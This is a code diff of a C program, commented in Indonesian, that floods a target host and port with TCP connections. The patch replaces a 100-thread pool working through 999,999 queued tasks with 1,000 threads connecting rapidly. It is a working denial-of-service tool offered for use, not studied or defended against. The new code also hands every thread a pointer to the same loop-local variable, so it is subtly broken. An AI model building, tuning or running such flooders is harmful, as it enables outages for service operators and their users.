@@ -4,15 +4,17 @@
 #include <pthread.h>
 #include <unistd.h>
 #include <netdb.h>
-#include <signal.h>
 #include <sys/socket.h>
 #include <sys/types.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
+#include <poll.h>
+#include <signal.h>
+#include <errno.h>
 
-#define CONNECTIONS 8
-#define THREAD_POOL_SIZE 100   // Jumlah thread dalam pool
-#define MAX_TASKS 10000        // Jumlah maksimum tugas koneksi dalam antrian
+#define CONNECTIONS 1    // 1 koneksi per thread untuk urutan berkelanjutan
+#define THREAD_POOL_SIZE 1000  // Jumlah thread besar
+#define MAX_TASKS 10000        // Task queue limit
 
 typedef struct {
     char host[256];
@@ -62,31 +64,19 @@ int make_socket(char *host, char *port) {
 }
 
 void *worker_thread(void *arg) {
-    while (1) {
-        Task task;
-
-        // Mengambil tugas dari antrian
-        pthread_mutex_lock(&queue_mutex);
-        while (task_count == 0) {
-            pthread_cond_wait(&queue_cond, &queue_mutex);
+    Task *task = (Task *)arg;
+    int sockets[CONNECTIONS];
+    signal(SIGPIPE, &broke);
+    for (int i = 0; i < CONNECTIONS; i++) {
+        sockets[i] = make_socket(task->host, task->port);
+        if (sockets[i] != -1) {
+            write(sockets[i], "\0", 1);  // Kirim data dummy
+            fprintf(stderr, "[%i: Connection Established]\n", task->id);
+            close(sockets[i]);
+        } else {
+            fprintf(stderr, "[%i: Connection Failed]\n", task->id);
         }
-        task = task_queue[--task_count];
-        pthread_mutex_unlock(&queue_mutex);
-
-        // Menjalankan tugas koneksi
-        int sockets[CONNECTIONS];
-        signal(SIGPIPE, &broke);
-        for (int i = 0; i < CONNECTIONS; i++) {
-            sockets[i] = make_socket(task.host, task.port);
-            if (sockets[i] != -1) {
-                write(sockets[i], "\0", 1);
-                fprintf(stderr, "[%i: Connection Established]\n", task.id);
-                close(sockets[i]);
-            } else {
-                fprintf(stderr, "[%i: Connection Failed]\n", task.id);
-            }
-        }
-        usleep(300000); // Delay antara koneksi
+        usleep(100000); // Delay 100ms untuk urutan cepat
     }
     return NULL;
 }
@@ -110,18 +100,14 @@ int main(int argc, char *argv[]) {
     }
 
     pthread_t threads[THREAD_POOL_SIZE];
-
-    // Membuat thread pool
     for (int i = 0; i < THREAD_POOL_SIZE; i++) {
-        pthread_create(&threads[i], NULL, worker_thread, NULL);
+        Task task;
+        strncpy(task.host, argv[1], sizeof(task.host));
+        strncpy(task.port, argv[2], sizeof(task.port));
+        task.id = i;
+        pthread_create(&threads[i], NULL, worker_thread, &task);
     }
 
-    // Menambahkan tugas ke dalam antrian
-    for (int i = 0; i < 999999; i++) {  // Jumlah tugas yang sangat besar
-        add_task(argv[1], argv[2], i);
-    }
-
-    // Menunggu thread pool berjalan selamanya
     for (int i = 0; i < THREAD_POOL_SIZE; i++) {
         pthread_join(threads[i], NULL);
     }
